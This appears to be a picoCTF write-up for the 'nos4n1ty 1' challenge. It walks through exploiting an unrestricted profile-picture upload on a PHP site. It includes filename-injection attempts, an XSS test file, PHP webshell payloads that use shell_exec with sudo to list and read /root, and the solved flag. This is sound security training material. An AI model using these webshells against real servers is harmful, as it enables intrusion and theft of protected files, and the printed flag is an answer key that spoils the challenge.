<h1>nos4n1ty 1</h1>

From: https://play.picoctf.org/practice/challenge/482

Author: Prince Niyonshuti N.

Description: A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.

Tags: Easy, Web Exploitation, picoCTF2025, browser_webshell_solvable
---

<h2>General functionality</h2>
Upon launching the instance, the user is prompted to upload a profile picture via the following interface on the website:

![image](https://github.com/user-attachments/assets/c9f1df2a-a2ee-4b48-893e-25a27dea6eb4)

When the picture is uploaded, a confirmation string is returned in a basic html page called /upload.php

![image](https://github.com/user-attachments/assets/48dfad7b-0c32-47dc-9c5e-fb9faa12ee4c)

The html file for the page reveals what I understand to be the image loading and previewing script:

![image](https://github.com/user-attachments/assets/c2fb1ec3-f285-469c-b738-e3c08e3457fd)

<h2>Initial Thoughts</h2>

So, we know that PHP is in use by the URL after submitting the image. We also know that the name of the file uplaoded is returned to us in a confirmation page. We might be able to inject script to this system by creating a specific file name.

We will aim for remote code execution, since this may allow us to retrieve the contents of files stored in the root of the system.

From: https://www.imperva.com/learn/application-security/php-injection/
__"RCE happens when a threat actor uploads code into your website and executes it. Typically, the source of the issue is a PHP bug that accepts user input and then evaluates it as PHP code. For example, threat actors can exploit a RCE vulnerability to create a file that contains a malicious script, designed to let the actor gain access to the target website."__

<h2>Experimentation</h2>

Sending filename: `;phpinfo();`
- returns: `The file ;phpinfo(); has been uploaded Path: uploads/;phpinfo();`

Sending filenmae: `<?php eval ("echo ".$REQUEST["uploads"].";"); ?>`
- returns `The file <?php eval (%22echo %22.$REQUEST[%22uploads%22].%22;%22); ?> has been uploaded Path: uploads/`

This means that quotation marks are being replaced with "%22". This might mean that the filename we have sent is being parsed via rawurlencode() as per https://www.php.net/manual/en/function.rawurlencode.php which describes the function as:
__"Returns a string in which all non-alphanumeric characters except -_.~ have been replaced with a percent (%) sign followed by two hex digits. This is the encoding described in » RFC 3986 for protecting literal characters from being interpreted as special URL delimiters, and for protecting URLs from being mangled by transmission media with character conversions (like some email systems)."__

When I try to go the url after uploading my image... `http://standard-pizzas.picoctf.net:62426/uploads/%3C?php%20eval%20(%22echo%20%22.$REQUEST[%22uploads%22].%22;%22);%20?%3E`

We get a URL not found error, but also the text: `Apache/2.4.54 (Debian) Server at standard-pizzas.picoctf.net Port 62426` which might be a clue as to the available vulnerabilties.

After trying a few more injection types with the file name, I gave up and started prodding the other type of input santization - whether the file being uploaded is actually an image.

I prompted chat GPT for a mockup html and JS injection payload to see whether this is an avenue I should pursue.

Sending the following file and navigating to its path in the url...: 
```
<!-- test.html -->
<script>alert('XSS via HTML file');</script>
```
- returns:

![image](https://github.com/user-attachments/assets/c0b25a42-c7c4-4f6a-84d2-4ce213cd0cab)

This shows that its possible to get new HTML and Javascript onto the server via the file upload.

<h2>Exploring remote execution</h2>

After some further experimentation, I created a .php file with the code `<?php phpinfo(); ?>`. When I then navigated to that page on the server, many details about the installation were revealed. Some interesting ones have been noted below:

`System 	Linux challenge 6.8.0-1024-aws #26-Ubuntu SMP Tue Feb 18 17:22:37 UTC 2025 x86_64 `

`PHP API 	20190902`

`Apache Version 	Apache/2.4.54 (Debian)`

`Server Administrator 	webmaster@localhost`

`Server Root 	/etc/apache2`

`PHP Version 	7.4.33`

`cURL support 	enabled`

`cURL Information 	7.74.0`

`PWD 	/challenge`

From https://www.php.net/manual/en/function.shell-exec.php I took an example for shell execution code and modified it to show all files in an active directory.
Sending:
```
<?php
$output = shell_exec('ls -la');
echo "<pre>$output</pre>";
?>
```
- returns:

![image](https://github.com/user-attachments/assets/af4ae45e-da96-4134-ae48-688baec353a1)

It seems that, I can execute shell code, and see list the files in the current directory.

I wasn't able to shift directories via cd, but instead I can change the ls command to different directory using this payload
```
<?php
$output = shell_exec('ls /root -l');
echo "<pre>$output</pre>";
?>
```
However, this returns a blank page, how interesting...

with only specify the / directory, I can see the file structure for the machine:

![image](https://github.com/user-attachments/assets/543f62ec-0f89-440f-86e3-709b57bde680)

When sending the this command with `ls -la` command, we can see the priviliges for the different directories, notice that root doesn't have many permissions

![image](https://github.com/user-attachments/assets/f8f82b2b-abd2-4869-a107-506b34554c23)

from: https://linuxhandbook.com/linux-file-permissions/ this means that only an administrator can view this directory:

![image](https://github.com/user-attachments/assets/eb1aabfa-1dc3-4636-9a92-c1d7aeb56c61)

modifying the code to be:
```
<?php
$output = shell_exec('sudo ls /root -l');
echo "<pre>$output</pre>";
?>
```
- returns:

![image](https://github.com/user-attachments/assets/22230c0f-b698-485f-9790-7de542fb6364)

Cool! we can see the flag!

lets try the same shell code, but cat the file directly with the full path.
```
<?php
$output = shell_exec('sudo cat /root/flag.txt');
echo "<pre>$output</pre>";
?>
```
returns:

![image](https://github.com/user-attachments/assets/72047e65-403e-4cd0-bc23-2453883970c7)

__`picoCTF{wh47_c4n_u_d0_wPHP_d698d800}`__

Whoopee!





Applications used during CTF:

- Kali Linux

- Mozilla Firefox

- Visual Studio Code


Core sources of information:

Imperva: https://www.imperva.com/learn/application-security/php-injection/
  - Overview of PHP injection

PHP: https://www.php.net/manual/en/function.shell-exec.php
  - Documentation for shell_exec()

Linux Handbook: https://linuxhandbook.com/linux-file-permissions/
  - Guides for linux file structure and permissions

ChatGPT: https://chatgpt.com/
  - Review of JS code in footer, revealing potential avenues for exploitation







